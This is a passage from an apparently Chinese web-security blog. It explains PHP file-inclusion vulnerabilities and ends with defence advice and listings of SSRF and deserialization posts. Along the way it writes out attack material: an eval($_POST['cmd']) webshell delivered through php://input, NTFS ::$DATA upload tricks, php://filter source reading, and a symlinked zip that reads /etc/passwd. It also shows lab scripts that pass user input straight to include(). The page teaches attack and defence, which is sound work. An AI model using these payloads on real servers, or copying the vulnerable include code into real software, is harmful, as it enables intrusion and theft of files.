+上传 Test<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$DATA</span>\<span class="token package">0</span><span class="token punctuation">.</span>jpg  生成<span class="token number">0</span><span class="token punctuation">.</span>jpg  文件内容为<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+
+上传 Test<span class="token punctuation">.</span>php<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token variable">$DATA</span>\<span class="token package">aaa</span><span class="token punctuation">.</span>jpg  生成aaa<span class="token punctuation">.</span>jpg  文件内容为<span class="token delimiter">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span>
+
+<span class="token constant">PS</span><span class="token punctuation">:</span> 上传test<span class="token punctuation">.</span>php<span class="token punctuation">:</span>a<span class="token punctuation">.</span>jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test<span class="token punctuation">.</span>php<span class="token punctuation">:</span>a<span class="token punctuation">.</span>jpg查看内容，而test<span class="token punctuation">.</span>php为空也是正常的。
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h4 id="5-配置文件过滤不当"><a href="#5-配置文件过滤不当" class="headerlink" title="5.配置文件过滤不当"></a><strong>5.配置文件过滤不当</strong></h4><p>有些时候配置信息是直接写在服务器端的文件中的，如果我们能够绕过这就是一个 webshell</p>
+<p>这个也只是一个思路，只要是用户可控的内容往服务器上写，就存在包含的可能</p>
+<h4 id="6-php-伪协议包含"><a href="#6-php-伪协议包含" class="headerlink" title="6.php 伪协议包含"></a><strong>6.php 伪协议包含</strong></h4><p>这个就可以说是利用 php 的特性了，当然部分伪协议，比如 php://input 你要用还是需要 allow_url_include 打开,<strong>data:// 更是需要 php_url_fopen 和 php_uri_include 都打开</strong>（由于 data://输入远程文件包含的范畴，于是我在前面的部分已经提及了）</p>
+<h5 id="1-php-x2F-x2F-input"><a href="#1-php-x2F-x2F-input" class="headerlink" title="1.php://input"></a><strong>1.php://input</strong></h5><p>php://input 是个可以访问请求的原始数据的只读流(这个原始数据指的是POST数据)</p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625400.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php">https://picture-1253331270.cos.ap-beijing.myqcloud.com/php</a> input.png)此处输入图片的描述</p>
+<p>当然了，我们也能利用这个来执行命令，上传我们的一句话，直接 getshell,上菜刀</p>
+<pre class="line-numbers language-php"><code class="language-php">http<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//localhost/qweasdzxc.php?rf=php://input </span>
+<span class="token constant">POST</span> <span class="token punctuation">:</span>
+<span class="token delimiter">&lt;?php</span> <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token operator">&amp;</span>cmd 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p><strong>如图所示：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/getshell.png"><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625867.png" alt="img"></a></p>
+<h5 id="3-phar-x2F-x2F"><a href="#3-phar-x2F-x2F" class="headerlink" title="3.phar://"></a><strong>3.phar://</strong></h5><p>这个协议是仿照 Java 中的打包协议 Jar 弄出来的，他的特点就是能将任意后缀名的压缩包解包，得到里面指定的内容，这个方法在绕过后缀名限定的包含中非常好用</p>
+<p>包含方法：</p>
+<p>phar://aaa.bbb/shell.php </p>
+<p>具体可看：<a target="_blank" rel="noopener" href="http://www.91ri.org/13363.html">http://www.91ri.org/13363.html</a></p>
+<p><strong>拓展知识：</strong></p>
+<p>使用 phar:// 扩展 php 反序列化攻击面</p>
+<p><strong>链接：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p>
+<h5 id="4-php-x2F-x2F-filter："><a href="#4-php-x2F-x2F-filter：" class="headerlink" title="4.php://filter："></a><strong>4.php://filter：</strong></h5><p>这个是一个过滤器，里面的过滤方法很多，我们如果不想执行被包含的代码，我们就可以使用base64 编码输出，通常用来读取源码</p>
+<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定</p>
+<p>resource=&lt;要过滤的数据流&gt;     这个参数是必须的，且必须位于 php://filter 的末尾，并且指向需要过滤筛选的数据流。 read=&lt;读链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 write=&lt;写链的筛选列表&gt;     该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。 &lt;；两个链的筛选列表&gt;     任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。  </p>
+<p>举两个最简单的例子：</p>
+<p><strong>示例一：使用 php://filter/read=xxxx/resource=</strong></p>
+<p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">"rf"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;script>window.location.href = "./qweasdzxc.php?rf="&lt;/script>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token delimiter">?></span>
+
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> 
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>test page： rf<span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span><span class="token operator">--</span><span class="token operator">--</span>delete this page when the test has finished<span class="token operator">--</span><span class="token operator">--</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>实验截图：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625268.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php">https://picture-1253331270.cos.ap-beijing.myqcloud.com/php</a> filter read.png)</p>
+<p><strong>注意点：</strong></p>
+<p>(1)记住一旦使用了 read 选项，我们就值关心数据流的来源，这里的数据流的来源就是 resource<br>传入的，至于经过过滤器以后这个数据流要去哪里，这不是我们这个处理能决定的，还要依赖外部的函数<br>(2)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左</p>
+<p><strong>示例二：使用 php://filter/write=xxxx/resource=</strong></p>
+<p><strong>测试代码：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">array_key_exists</span><span class="token punctuation">(</span><span class="token string">"rf"</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'rf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token operator">!=</span> <span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span><span class="token string">"hello world"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string">'&lt;script>window.location.href = "./qweasdzxc.php?rf="&lt;/script>'</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+
+<span class="token delimiter">?></span>
+
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">/></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> 
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span></span>test page： rf<span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$input</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>
+            <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span></span><span class="token operator">--</span><span class="token operator">--</span>delete this page when the test has finished<span class="token operator">--</span><span class="token operator">--</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span></span>
+        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>
+    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>
+<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>实验截图：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625382.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/php">https://picture-1253331270.cos.ap-beijing.myqcloud.com/php</a> filter write.png)</p>
+<p><strong>注意点：</strong></p>
+<p>(1)一旦使用了 write 选项，我们就只关系数据的输出，数据的输出就是我们指定的 resource<br>的文件，而数据的输入要靠外部的函数帮我们实现<br>(2)我们的过滤是按照过滤器从左到右的顺序进行的，不要错误地认为是从右到左</p>
+<p>P 总在 2016 年讲过一个知识点 利用 php://filter bypass 死亡 exit 的方法，文章链接如下，我就不详细分析了</p>
+<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p>
+<p>但是这个方法的升级版也在 hitcon CTF 2018 One-line-php-challenge 中出现，这个方法是 Orange 的预期解法，可以看下面这个链接：</p>
+<p><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a></p>
+<p><strong>那么有哪些过滤器呢？</strong></p>
+<p>过滤器有很多种，有字符串过滤器、转换过滤器、压缩过滤器、加密过滤器</p>
+<p><strong>(1)字符串过滤器</strong></p>
+<pre class="line-numbers language-php"><code class="language-php">string<span class="token punctuation">.</span>rot13      进行rot13转换 
+string<span class="token punctuation">.</span>toupper    将字符全部大写 
+string<span class="token punctuation">.</span>tolower    将字符全部小写
+string<span class="token punctuation">.</span>strip_tags 去除空字符、<span class="token constant">HTML</span> 和 <span class="token constant">PHP</span> 标记后的结果  
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>(2)转换过滤器</strong></p>
+<pre class="line-numbers language-php"><code class="language-php">convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>encode  base64 编码
+convert<span class="token punctuation">.</span>base64<span class="token operator">-</span>decode  base64 解码
+convert<span class="token punctuation">.</span>quoted<span class="token operator">-</span>printable<span class="token operator">-</span>encode  quoted<span class="token operator">-</span>printable 编码（也是另一种将二进制进行编码的方案） 
+convert<span class="token punctuation">.</span>quoted<span class="token operator">-</span>printable<span class="token operator">-</span>decode  quoted<span class="token operator">-</span>printable 解码 
+convert<span class="token punctuation">.</span>iconv 实现任意两种编码之间的转换 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>(3)压缩过滤器</strong></p>
+<pre class="line-numbers language-php"><code class="language-php">zlib<span class="token punctuation">.</span>deflate 压缩过滤器 
+zlib<span class="token punctuation">.</span>inflate 解压过滤器 
+bzip2<span class="token punctuation">.</span>compress 压缩过滤器 
+bzip2<span class="token punctuation">.</span>decompress 解压过滤器 
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>(4)加密过滤器</strong></p>
+<p>mcrypt.*  加密过滤器 mdecrypt.* 解密过滤器 </p>
+<p><strong>一些实例：</strong></p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token function">readfile</span><span class="token punctuation">(</span>“php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/resource=http://www.example.com");</span>
+<span class="token function">readfile</span><span class="token punctuation">(</span>“php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=string.toupper/resource=http://www.example.com");</span>
+<span class="token function">readfile</span><span class="token punctuation">(</span>“php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=string.toupper|string.rot13/resource=http://www.example.com");</span>
+<span class="token function">file_put_contents</span><span class="token punctuation">(</span>“php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=example.txt”,”Hello World”);</span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>特别提一下这个过滤器convert.iconv</strong></p>
+<p>这个过滤器能实现几乎任意的两种编码之间的转化</p>
+<pre class="line-numbers language-php"><code class="language-php">php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/read=convert.iconv.UTF-8%2FASCII%2F%2FTRANSLIT/resource=... convert.iconv.ISO-8859-1/UTF-8 </span>
+php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/convert.iconv.UTF-8%2fUTF-7/resource= </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><strong>实际案例：</strong></p>
+<p><strong>(1) 案例一：</strong></p>
+<p>国外的一个安全人员在一次 CTF 中发现，使用连续两种编码之间的转换能骗过 解析器误认为 flag 文件是 图片格式.可以看这个链接：<a target="_blank" rel="noopener" href="https://gynvael.coldwind.pl/?lang=en&amp;id=671">https://gynvael.coldwind.pl/?lang=en&amp;id=671</a></p>
+<p><strong>(2) 案例二：</strong></p>
+<p>hitcon CTF 2018 one-line-php-challenge wupco 师傅的非预期解法 writeup:<a target="_blank" rel="noopener" href="https://hackmd.io/s/SkxOwAqiQ#">https://hackmd.io/s/SkxOwAqiQ#</a></p>
+<h4 id="7-软链接文件包含绕过open-basedir"><a href="#7-软链接文件包含绕过open-basedir" class="headerlink" title="7.软链接文件包含绕过open_basedir"></a><strong>7.软链接文件包含绕过open_basedir</strong></h4><p>这个方法在不少漏洞中都出现过，比如 gitlab 的任意文件读取，在 CTF 中也出现过多次，具体的细节可以看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2589">这篇文章</a>，或者看一下 HCTF2018 hide and seek 这道题，这道题也是利用了这种手法实现的任意文件读取</p>
+<p>我们首先构造一个指向 /etc/passwd 的软链接文件，看看能不能成功</p>
+<p>root@K0rz3n:~# ln -s /etc/passwd test </p>
+<p>看一下软链接的指向 </p>
+<pre class="line-numbers language-php"><code class="language-php">lrwxrwxrwx  <span class="token number">1</span> root root     <span class="token number">11</span> Nov <span class="token number">11</span> <span class="token number">06</span><span class="token punctuation">:</span><span class="token number">45</span> test <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>etc<span class="token operator">/</span>passwd 
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>现在我们把这个文件进行压缩</p>
+<pre class="line-numbers language-php"><code class="language-php">root@K0rz3n<span class="token punctuation">:</span><span class="token operator">~</span><span class="token shell-comment comment"># zip -y test.zip test </span>
+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上传然后 submit </p>
+<p><strong>如图所示：</strong></p>
+<p>[<img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161625529.png" alt="img">](<a target="_blank" rel="noopener" href="https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018">https://picture-1253331270.cos.ap-beijing.myqcloud.com/HCTF2018</a> hide_and_seek1.png)</p>
+<h2 id="0x04-如何防御："><a href="#0x04-如何防御：" class="headerlink" title="0x04 如何防御："></a><strong>0x04 如何防御：</strong></h2><p>1、无需情况下设置allow_url_include和allow_url_fopen为关闭</p>
+<p>2、对可以包含的文件进行限制，可以使用<strong>白名单的方式</strong>，或者设置可以包含的目录，<strong>如open_basedir</strong></p>
+<p>3、<strong>尽量不使用动态包含</strong></p>
+<p>4、严格检查变量是否已经初始化。</p>
+<p>5、建议假定所有输入都是可疑的，尝试对所有输入提交可能可能包含的文件地址，包括服务器本地文件及远程文件，进行严格的检查<strong>，参数中不允许出现../之类的目录跳转符。</strong></p>
+<p>6、严格检查include类的文件包含函数中的参数是否外界可控。</p>
+<p>7、不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</p>
+<h2 id="0X05-参考："><a href="#0X05-参考：" class="headerlink" title="0X05 参考："></a><strong>0X05 参考：</strong></h2><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86123">https://www.anquanke.com/post/id/86123</a><br><a target="_blank" rel="noopener" href="https://www.jb51.net/article/141767.htm">https://www.jb51.net/article/141767.htm</a><br><a target="_blank" rel="noopener" href="http://www.am0s.com/penetration/131.html">http://www.am0s.com/penetration/131.html</a><br><a target="_blank" rel="noopener" href="https://www.thinksaas.cn/group/topic/662092/">https://www.thinksaas.cn/group/topic/662092/</a><br><a target="_blank" rel="noopener" href="http://www.cnblogs.com/littlehann/p/3665062.html">http://www.cnblogs.com/littlehann/p/3665062.html</a><br><a target="_blank" rel="noopener" href="http://www.91ri.org/13363.html">http://www.91ri.org/13363.html</a><br><a target="_blank" rel="noopener" href="http://www.freebuf.com/column/148886.html">http://www.freebuf.com/column/148886.html</a><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a><br><a target="_blank" rel="noopener" href="http://skysec.top/2018/04/04/amazing-phpinfo/">http://skysec.top/2018/04/04/amazing-phpinfo/</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2148">https://xz.aliyun.com/t/2148</a><br><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin">https://www.jianshu.com/p/051a87f45222?utm_campaign=maleskine&amp;utm_content=note&amp;utm_medium=reader_share&amp;utm_source=weixin</a><br><a target="_blank" rel="noopener" href="http://php.net/manual/zh/session.upload-progress.php">http://php.net/manual/zh/session.upload-progress.php</a><br><a target="_blank" rel="noopener" href="http://wonderkun.cc/index.html/?p=718">http://wonderkun.cc/index.html/?p=718</a></p>
+<p>[<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/]">https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B%20PHP%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/]</a>(<a target="_blank" rel="noopener" href="https://www.k0rz3n.com/2018/11/20/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8B">https://www.k0rz3n.com/2018/11/20/一篇文章带你理解漏洞之</a> PHP 文件包含漏洞/)</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/php-fan-xu-lie-hua/">php反序列化</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/websec/">websec</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/websec/">websec</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">php反序列化</a></span><div class="content"><p>这篇文章介绍一下php反序列化漏洞</p></div><a class="more" href="/2023/04/16/php-fan-xu-lie-hua/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/ssrf-zhi-gong-ji-fastcgi/">SSRF之攻击fastcgi</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/SSRF/">SSRF</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/websec/">websec</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SSRF/">SSRF</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/fastcgi/">fastcgi</a></span><div class="content"><p>这篇文章介绍fastcgi的攻击方式。</p></div><a class="more" href="/2023/04/16/ssrf-zhi-gong-ji-fastcgi/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/ssrf-zhi-gong-ji-redis/">SSRF之攻击Redis</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/Cate/">Cate</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/Tag/">Tag</a></span><div class="content"><p>这篇文章总结一下SSRF打redis(redis的未授权漏洞)</p>
+<h1 id="SSRF—gopher和dict打redis"><a href="#SSRF—gopher和dict打redis" class="headerlink" title="SSRF—gopher和dict打redis"></a>SSRF—gopher和dict打redis</h1></div><a class="more" href="/2023/04/16/ssrf-zhi-gong-ji-redis/#more">阅读更多</a><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2023/04/16/ssrf/">SSRF</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2023-04-16</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/websec/">websec</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/websec/">websec</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/SSRF/">SSRF</a></span><div class="content"><p>这篇文章介绍SSRF攻击基本知识。</p>
+<h1 id="ssrf概述"><a href="#ssrf概述" class="headerlink" title="ssrf概述"></a>ssrf概述</h1><h2 id="一、什么是ssrf"><a href="#一、什么是ssrf" class="headerlink" title="一、什么是ssrf"></a>一、什么是ssrf</h2><p>脑图一张：</p>
+<p><img src="https://blog-1313934826.cos.ap-chengdu.myqcloud.com/blog-images/202304161555468.png"></p>
+<h3 id="1-解释"><a href="#1-解释" class="headerlink" title="1.解释"></a>1.解释</h3><p>服务器端请求伪造（SSRF：Server-Side Request Forgery）是一个 Web 安全漏洞，意为：攻击者诱导服务器将 HTTP 请求发送到攻击者选择的一个目标上。一般情况下，SSRF攻击的目标是从外网无法访问的内部系统。</p>
+<h3 id="2-形成："><a href="#2-形成：" class="headerlink" title="2.形成："></a>2.形成：</h3><p>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。典例代码：</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
+    <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token shell-comment comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
